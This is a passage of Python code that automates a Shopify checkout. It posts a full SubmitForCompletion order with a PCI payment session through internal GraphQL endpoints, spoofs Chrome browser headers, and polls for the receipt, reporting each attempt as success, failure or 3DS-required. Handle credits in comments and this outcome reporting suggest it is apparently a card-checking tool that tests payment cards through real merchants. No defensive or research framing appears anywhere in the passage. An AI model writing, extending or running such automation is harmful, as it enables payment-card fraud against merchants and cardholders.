print(f"PCI Status: {pci_resp.status_code}")
pci_session_id = extract_pci_session_id(pci_resp.text)
print(f"PciSessionId: {pci_session_id}")

attempt_token = generate_attempt_token(checkout_token)
page_id = generate_page_id()

signed_handles_list = [{"signedHandle": h} for h in signed_handles] if signed_handles else []

submit_variables = {
    "input": {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token3,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [{
                "destination": {
                    "streetAddress": {
                        "address1": addr["address1"], "address2": addr["address2"],
                        "city": addr["city"], "countryCode": addr["country_code"],
                        "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                        "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                        "phone": addr["phone"], "oneTimeUse": False
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
                    "options": {}
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"value": {"amount": shipping_amount, "currencyCode": currency}},
                "destinationChanged": False
            }],
            "noDeliveryRequired": [], "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
        },
        "deliveryExpectations": {"deliveryExpectationLines": signed_handles_list},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{selected_variant['id']}",
                        "variantId": f"gid://shopify/ProductVariant/{selected_variant['id']}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": selected_variant['price'], "currencyCode": currency}},
                "lineComponentsSource": None, "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"value": {"amount": total_amount, "currencyCode": currency}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "sessionId": pci_session_id,
                        "billingAddress": {
                            "streetAddress": {
                                "address1": addr["address1"], "address2": addr["address2"],
                                "city": addr["city"], "countryCode": addr["country_code"],
                                "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                                "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                                "phone": addr["phone"]
                            }
                        }
                    }
                },
                "amount": {"value": {"amount": total_amount, "currencyCode": currency}}
            }],
            "billingAddress": {
                "streetAddress": {
                    "address1": addr["address1"], "address2": addr["address2"],
                    "city": addr["city"], "countryCode": addr["country_code"],
                    "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                    "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                    "phone": addr["phone"]
                }
            }
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": currency, "countryCode": country},
            "email": email, "emailChanged": False,
            "phoneCountryCode": country, "marketingConsent": [],
            "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False
        },
        "tip": {"tipLines": []}, "poNumber": None,
        "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True},
                  "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
                  "proposedExemptions": []},
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
        "scriptFingerprint": {"signature": None, "signatureUuid": None,
                              "lineItemScriptChanges": [], "paymentScriptChanges": [],
                              "shippingScriptChanges": []},
        "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": []
    },
    "attemptToken": attempt_token,
    "metafields": [],
    "analytics": {"requestUrl": checkout_url_final, "pageId": page_id}
}

submit_gql = json.dumps({
    "variables": submit_variables,
    "operationName": "SubmitForCompletion",
    "id": submit_id
})

submit_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': domain,
    'referer': checkout_url_final,
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'x-checkout-one-session-token': session_token,
    'x-checkout-web-build-id': build_id,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-source-id': source_token,
}

submit_resp = session.post(
    f"{domain}/checkouts/internal/graphql/persisted",
    params={'operationName': 'SubmitForCompletion'},
    headers=submit_headers,
    data=submit_gql,
)

print(f"Submit Status: {submit_resp.status_code}")
print(f"Submit Response: {submit_resp.text}")

submit_data = submit_resp.json()
receipt_id = ""
receipt_session_token = ""

submit_for_completion = submit_data.get('data', {}).get('submitForCompletion', {})
receipt = submit_for_completion.get('receipt', {})

if receipt:
    receipt_id = receipt.get('id', '')
    print(f"ReceiptId: {receipt_id}")
    purchase_order = receipt.get('purchaseOrder', {})
    if purchase_order:
        receipt_session_token = purchase_order.get('sessionToken', '')
        print(f"ReceiptSessionToken: {receipt_session_token}")
    typename = receipt.get('__typename', '')
    print(f"Receipt __typename: {typename}")

if not receipt_id:
    receipt_id = extract_receipt_id(submit_resp.text)
if not receipt_session_token:
    receipt_session_token = extract_receipt_session_token(submit_resp.text)

#@MentosReborn
#@CodeXploide

if receipt_id and receipt_session_token and poll_id:
    for poll_num in range(1, 6):
        poll_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'priority': 'u=1, i',
            'referer': checkout_url_final,
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': source_token,
        }

        poll_params = {
            'operationName': 'PollForReceipt',
            'variables': json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
            'id': poll_id,
        }

        poll_resp = session.get(
            f"{domain}/checkouts/internal/graphql/persisted",
            params=poll_params,
            headers=poll_headers,
        )

        print(f"Poll {poll_num} Status: {poll_resp.status_code}")
        print(f"Poll {poll_num} Response: {poll_resp.text}")

        try:
            poll_json = poll_resp.json()
            receipt_data = poll_json.get('data', {}).get('receipt', {})
            if receipt_data:
                typename = receipt_data.get('__typename', '')
                print(f"Poll {poll_num} __typename: {typename}")
                if typename == 'ProcessedReceipt':
                    print("Order placed successfully")
                    break
                elif typename == 'FailedReceipt':
                    error = receipt_data.get('processingError', {})
                    print(f"Payment failed: {json.dumps(error)}")
                    break
                elif typename == 'ActionRequiredReceipt':
                    print("3DS authentication required")
                    break
        except:
            pass
else:
    if not receipt_id and not receipt_session_token:
        print("Missing receipt_id and receipt_session_token")
        error_msg = extract_submit_error(submit_resp.text)
        if error_msg:
            print(f"Submit error: {error_msg}")
    elif not poll_id:
        print("Missing PollForReceiptId, cannot poll")